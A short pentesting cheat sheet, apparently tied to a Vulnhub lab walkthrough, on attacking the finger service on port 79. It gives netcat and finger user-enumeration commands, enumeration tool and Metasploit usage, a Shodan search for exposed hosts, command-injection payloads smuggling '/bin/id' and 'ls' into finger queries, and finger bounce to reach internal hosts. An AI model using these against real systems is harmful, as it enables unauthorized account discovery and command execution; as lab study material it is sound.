#user-enumeration 
Linux finger port is mainly used for checking if the users are available on the target or not 
reference - [[walkthroughs/Vulnhub/Vulnix/vulnix|vulnix]]

### Basic enumeration
```
nc -vn <IP> 79
echo "root" | nc -vn <IP> 79
```

### User enumeration
```
finger @<Victim>       #List users
finger admin@<Victim>  #Get info of user
finger user@<Victim>   #Get info of user
```

we can also use the pentestmonkey script:
`https://pentestmonkey.net/tools/user-enumeration/finger-user-enum`
```
finger-user-enum.pl -U users.txt -t 10.0.0.1
finger-user-enum.pl -u root -t 10.0.0.1
finger-user-enum.pl -U users.txt -T ips.txt
```

### Metasploit uses more tricks than Nmap
```
use auxiliary/scanner/finger/finger_users
```

### Shodan
- `port:79 USER`

### Command execution
```
finger "|/bin/id@example.com"
finger "|/bin/ls -a /@example.com"
```

# Finger bounce:
```
finger user@host@victim
finger @internal@external
```
for more info: 
`https://securiteam.com/exploits/2BUQ2RFQ0I/`
